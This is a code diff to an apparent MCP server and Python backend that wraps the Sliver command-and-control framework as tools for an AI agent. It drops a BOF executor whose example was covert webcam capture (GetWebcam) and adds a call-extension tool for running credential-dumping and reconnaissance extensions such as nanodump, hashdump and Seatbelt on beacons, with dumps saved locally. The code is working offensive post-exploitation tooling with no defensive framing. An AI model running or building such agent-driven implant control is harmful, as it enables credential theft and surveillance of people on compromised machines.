@@ -451,56 +451,67 @@ async def execute_command(client, command, params):
         }
 
     elif command == "beacon_execute_bof":
-        import time as _time, base64 as _b64
+        # execute_bof tidak tersedia di sliver-py wrapper.
+        # Gunakan beacon_call_extension untuk armory extensions (CallExtension via gRPC),
+        # atau beacon_sideload / beacon_execute_shellcode untuk raw shellcode.
+        return {
+            "error": "execute_bof tidak didukung sliver-py API. Gunakan beacon_call_extension untuk armory tools (nanodump, Seatbelt, dll), atau beacon_execute_assembly untuk .NET assemblies."
+        }
+
+    elif command == "beacon_call_extension":
+        # Panggil armory extension yang sudah di-install via gRPC CallExtension
+        import time as _time
+        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2ce
+        from sliver.pb.commonpb import common_pb2 as _common_pb2ce
         beacon_id = params.get("beacon_id")
-        bof_path = params.get("bof_path")
-        bof_args_b64 = params.get("args", [])
-        timeout_secs = int(params.get("timeout", 120))
+        extension_name = params.get("extension_name")  # e.g. "nanodump", "Seatbelt"
+        args_b64 = params.get("args_b64", "")          # args as base64 bytes
+        export_name = params.get("export_name", "")
+        timeout_secs = int(params.get("timeout", 180))
         save_path = params.get("save_path", "")
 
-        if not beacon_id or not bof_path:
-            return {"error": "beacon_id and bof_path required"}
+        if not beacon_id or not extension_name:
+            return {"error": "beacon_id and extension_name required"}
 
-        with open(bof_path, 'rb') as _f:
-            bof_data = _f.read()
+        import base64 as _b64
+        args_bytes = _b64.b64decode(args_b64) if args_b64 else b""
 
-        bof_args = [_b64.b64decode(a) for a in bof_args_b64] if bof_args_b64 else []
+        req = _sliver_pb2ce.CallExtensionReq(
+            Name=extension_name,
+            Export=export_name,
+            Args=args_bytes,
+            Request=_common_pb2ce.Request(BeaconID=beacon_id, Async=True)
+        )
+        resp = await client._stub.CallExtension(req, metadata=client._metadata)
+        task_id = resp.Response.TaskID if resp.Response else ""
 
-        interact = await client.interact_beacon(beacon_id)
-        task = await interact.execute_bof(bof_data, bof_args)
-        task_id = task.ID
+        if not task_id:
+            return {"error": "No task_id returned — extension might not be installed. Run armory install first."}
 
-        # Poll for task completion
         deadline = _time.time() + timeout_secs
         while _time.time() < deadline:
             await asyncio.sleep(10)
             try:
-                task_content = await client.beacon_task_content(task_id)
-                if task_content and hasattr(task_content, 'Response') and task_content.Response:
-                    data = task_content.Response
-                    if save_path:
+                tc = await client.beacon_task_content(task_id)
+                if tc and tc.Response:
+                    ext_r = _sliver_pb2ce.CallExtension()
+                    ext_r.ParseFromString(tc.Response)
+                    output = ext_r.Output.decode('utf-8', errors='replace') if ext_r.Output else ""
+                    if save_path and ext_r.Output:
+                        import os as _os
+                        _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
                         with open(save_path, 'wb') as _f:
-                            _f.write(data)
-                        return {
-                            "success": True,
-                            "task_id": task_id,
-                            "save_path": save_path,
-                            "size": len(data)
-                        }
-                    else:
-                        return {
-                            "success": True,
-                            "task_id": task_id,
-                            "output": data.decode('utf-8', errors='replace'),
-                            "size": len(data)
-                        }
-            except Exception as _e:
+                            _f.write(ext_r.Output)
+                    return {
+                        "success": True, "task_id": task_id,
+                        "output": output,
+                        "size": len(ext_r.Output) if ext_r.Output else 0,
+                        "saved_to": save_path if save_path and ext_r.Output else None
+                    }
+            except Exception:
                 pass
 
-        return {
-            "error": f"Timeout ({timeout_secs}s) — beacon belum eksekusi BOF",
-            "task_id": task_id
-        }
+        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}
 
     elif command == "beacon_open_session":
         import time as _time
@@ -1391,7 +1402,7 @@ async def execute_command(client, command, params):
             try:
                 tc = await client.beacon_task_content(task_id)
                 if tc and tc.Response:
-                    ns = _sliver_pb2bns.NetstatResponse()
+                    ns = _sliver_pb2bns.Netstat()
                     ns.ParseFromString(tc.Response)
                     return {
                         "success": True, "task_id": task_id,
@@ -1996,22 +2007,29 @@ const SLIVER_TOOLS: Tool[] = [
   },
   {
     name: "sliver_beacon_execute_bof",
-    description: "Execute a BOF (Beacon Object File) on a beacon. Polls for result until timeout. For GetWebcam BOF: provide bof_path to GetWebcam.o and save_path for output JPEG.",
+    description: "DEPRECATED — execute_bof tidak didukung sliver-py. Gunakan sliver_beacon_call_extension untuk armory tools.",
     inputSchema: {
       type: "object",
       properties: {
         beacon_id: { type: "string", description: "Beacon ID" },
-        bof_path: { type: "string", description: "Local path to .o BOF file (e.g. ~/.sliver/armory/.../GetWebcam.o)" },
-        args: {
-          type: "array",
-          items: { type: "string" },
-          description: "BOF arguments as base64-encoded byte arrays",
-          default: [],
-        },
-        save_path: { type: "string", description: "Local path to save binary output (e.g. /tmp/webcam.jpg). Leave empty to get text output." },
-        timeout: { type: "number", description: "Seconds to wait for beacon (default: 120)", default: 120 },
       },
-      required: ["beacon_id", "bof_path"],
+      required: ["beacon_id"],
+    },
+  },
+  {
+    name: "sliver_beacon_call_extension",
+    description: "Call an installed armory extension on a beacon (async). Armory tools: nanodump, Seatbelt, SharpUp, hashdump, etc. Install first with 'armory install <name>' in Sliver console.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        extension_name: { type: "string", description: "Extension name as installed (e.g. 'nanodump', 'Seatbelt', 'hashdump')" },
+        args_b64: { type: "string", description: "Arguments as base64-encoded bytes (empty for no args)", default: "" },
+        export_name: { type: "string", description: "DLL export to call (usually empty for default)", default: "" },
+        save_path: { type: "string", description: "Local path to save binary output (e.g. /tmp/nanodump.dmp). Leave empty for text output." },
+        timeout: { type: "number", description: "Seconds to wait for beacon check-in (default: 180)", default: 180 },
+      },
+      required: ["beacon_id", "extension_name"],
     },
   },
   {
@@ -2851,6 +2869,10 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
 
       case "sliver_beacon_execute_bof":
         result = await executeSliverCommand("beacon_execute_bof", args as Record<string, unknown>);
+        break;
+
+      case "sliver_beacon_call_extension":
+        result = await executeSliverCommand("beacon_call_extension", args as Record<string, unknown>);
         break;
 
       case "sliver_beacon_open_session":
